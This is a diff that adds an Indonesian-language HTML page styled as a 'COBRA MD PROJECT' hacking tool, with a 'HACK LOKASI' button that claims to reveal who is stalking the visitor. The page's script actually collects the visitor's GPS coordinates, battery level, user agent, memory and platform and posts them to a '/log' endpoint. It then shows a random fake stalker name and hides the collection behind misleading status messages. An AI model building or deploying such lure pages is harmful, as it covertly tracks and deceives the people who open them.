@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>COBRA MD PROJECT</title>
+  <style>
+    body {
+      background-color: black;
+      color: red;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+      overflow: hidden;
+    }
+    #loading {
+      position: fixed;
+      background-color: black;
+      color: red;
+      width: 100%;
+      height: 100%;
+      z-index: 99;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5em;
+      animation: flicker 1s infinite alternate;
+    }
+    h1 {
+      font-size: 2.7em;
+      margin-bottom: 10px;
+      animation: flicker 1.5s infinite alternate;
+    }
+    .glitch-button {
+      border: 2px solid red;
+      padding: 15px 30px;
+      margin-top: 30px;
+      font-size: 1.2em;
+      cursor: pointer;
+      color: red;
+      background: black;
+      position: relative;
+      transition: background 0.3s;
+    }
+    .glitch-button:hover {
+      background: red;
+      color: black;
+    }
+    #result {
+      margin-top: 25px;
+      font-size: 1.1em;
+      color: white;
+      z-index: 2;
+    }
+    @keyframes flicker {
+      from { opacity: 1; }
+      to { opacity: 0.5; }
+    }
+  </style>
+</head>
+<body>
+  <div id="loading">🧠 Mendeteksi realitas digital...</div>
+
+  <h1>☠️ WELCOME TO<br> COBRA MD PROJECT</h1>
+
+  <div class="glitch-button" onclick="track()">HACK LOKASI</div>
+
+  <div id="result"></div>
+
+  <script>
+    const result = document.getElementById("result");
+    const loading = document.getElementById("loading");
+    const randomNames = ["SatriaHitam", "HantuLangit", "Pengintai08", "X-Shadow", "404User", "SilentWolf", "DewaGelap"];
+
+    window.onload = () => {
+      setTimeout(() => {
+        loading.style.display = "none";
+      }, 2000);
+    };
+
+    function sendLog(lat, lon, acc, battery) {
+      fetch("/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          lat: lat,
+          lon: lon,
+          acc: acc,
+          ua: navigator.userAgent,
+          memory: navigator.deviceMemory || "Unknown",
+          platform: navigator.platform || "Unknown",
+          battery: battery
+        })
+      }).then(() => {
+        const name = randomNames[Math.floor(Math.random() * randomNames.length)];
+        result.innerHTML = `🔍 Penguntitmu: <b>${name}</b>`;
+      });
+    }
+
+    function track() {
+      result.innerHTML = "⏳ Mengakses koordinat target...";
+
+      if (!navigator.geolocation) {
+        result.innerHTML = "❌ Perangkat tidak mendukung lokasi.";
+        sendLog(null, null, null, "Unknown");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+
+          navigator.getBattery().then((batt) => {
+            const battery = Math.round(batt.level * 100) + "%";
+            result.innerHTML = "📡 Lokasi ditemukan. Memproses...";
+            sendLog(lat, lon, acc, battery);
+          }).catch(() => {
+            sendLog(lat, lon, acc, "Unknown");
+          });
+        },
+        (err) => {
+          result.innerHTML = "⚠️ Akses lokasi ditolak. Menggunakan protokol alternatif...";
+          navigator.getBattery().then((batt) => {
+            const battery = Math.round(batt.level * 100) + "%";
+            sendLog(null, null, null, battery);
+          }).catch(() => {
+            sendLog(null, null, null, "Unknown");
+          });
+        },
+        { timeout: 5000 }
+      );
+    }
+  </script>
+</body>
+</html>
